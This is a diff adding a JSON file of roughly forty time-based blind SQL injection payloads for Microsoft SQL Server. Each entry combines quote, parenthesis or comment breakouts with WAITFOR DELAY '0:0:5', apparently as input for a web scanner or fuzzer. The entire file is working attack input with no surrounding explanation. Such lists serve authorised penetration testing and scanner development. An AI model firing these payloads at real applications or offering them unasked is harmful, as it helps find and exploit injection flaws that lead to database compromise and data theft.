@@ -1,0 +1,150 @@
+[
+  {
+    "name": "mssql",
+    "payload": ";waitfor delay '0:0:5'--"
+  },
+  {
+    "name": "mssql",
+    "payload": "';WAITFOR DELAY '0:0:5'--"
+  },
+  {
+    "name": "mssql",
+    "payload": ");waitfor delay '0:0:5'--"
+  },
+  {
+    "name": "mssql",
+    "payload": "';waitfor delay '0:0:5'--"
+  },
+  {
+    "name": "mssql",
+    "payload": "\";waitfor delay '0:0:5'--"
+  },
+  {
+    "name": "mssql",
+    "payload": "');waitfor delay '0:0:5'--"
+  },
+  {
+    "name": "mssql",
+    "payload": "\");waitfor delay '0:0:5'--"
+  },
+  {
+    "name": "mssql",
+    "payload": "));waitfor delay '0:0:5'--"
+  },
+  {
+    "name": "mssql",
+    "payload": "'));waitfor delay '0:0:5'--"
+  },
+  {
+    "name": "mssql",
+    "payload": "\"));waitfor delay '0:0:5'--"
+  },
+  {
+    "name": "mssql",
+    "payload": "\") IF (1=1) WAITFOR DELAY '0:0:5'--"
+  },
+  {
+    "name": "mssql",
+    "payload": "';%5waitfor%5delay%5'0:0:5'%5--%5"
+  },
+  {
+    "name": "mssql",
+    "payload": "' WAITFOR DELAY '0:0:5'--"
+  },
+  {
+    "name": "mssql",
+    "payload": "' WAITFOR DELAY '0:0:5'"
+  },
+  {
+    "name": "mssql",
+    "payload": "or WAITFOR DELAY '0:0:5'--"
+  },
+  {
+    "name": "mssql",
+    "payload": "or WAITFOR DELAY '0:0:5'"
+  },
+  {
+    "name": "mssql",
+    "payload": "and WAITFOR DELAY '0:0:5'--"
+  },
+  {
+    "name": "mssql",
+    "payload": "and WAITFOR DELAY '0:0:5'"
+  },
+  {
+    "name": "mssql",
+    "payload": "WAITFOR DELAY '0:0:5'"
+  },
+  {
+    "name": "mssql",
+    "payload": ";WAITFOR DELAY '0:0:5'--"
+  },
+  {
+    "name": "mssql",
+    "payload": ";WAITFOR DELAY '0:0:5'"
+  },
+  {
+    "name": "mssql",
+    "payload": "1 WAITFOR DELAY '0:0:5'--"
+  },
+  {
+    "name": "mssql",
+    "payload": "1 WAITFOR DELAY '0:0:5'"
+  },
+  {
+    "name": "mssql",
+    "payload": "1 WAITFOR DELAY '0:0:5'-- 1337"
+  },
+  {
+    "name": "mssql",
+    "payload": "1' WAITFOR DELAY '0:0:5' AND '1337'='1337"
+  },
+  {
+    "name": "mssql",
+    "payload": "1') WAITFOR DELAY '0:0:5' AND ('1337'='1337"
+  },
+  {
+    "name": "mssql",
+    "payload": "1) WAITFOR DELAY '0:0:5' AND (1337=1337"
+  },
+  {
+    "name": "mssql",
+    "payload": "') WAITFOR DELAY '0:0:5'--"
+  },
+  {
+    "name": "mssql",
+    "payload": "\" WAITFOR DELAY '0:0:5'--"
+  },
+  {
+    "name": "mssql",
+    "payload": "')) WAITFOR DELAY '0:0:5'--"
+  },
+  {
+    "name": "mssql",
+    "payload": "'))) WAITFOR DELAY '0:0:5'--"
+  },
+  {
+    "name": "mssql",
+    "payload": "%' WAITFOR DELAY '0:0:5'--"
+  },
+  {
+    "name": "mssql",
+    "payload": "\") WAITFOR DELAY '0:0:5'--"
+  },
+  {
+    "name": "mssql",
+    "payload": "\")) WAITFOR DELAY '0:0:5'--"
+  },
+  {
+    "name": "mssql",
+    "payload": "\"))) WAITFOR DELAY '0:0:5'--"
+  },
+  {
+    "name": "mssql",
+    "payload": "1 waitfor delay '0:0:5'--"
+  },
+  {
+    "name": "mssql",
+    "payload": "1' waitfor delay '0:0:5'--"
+  }
+]
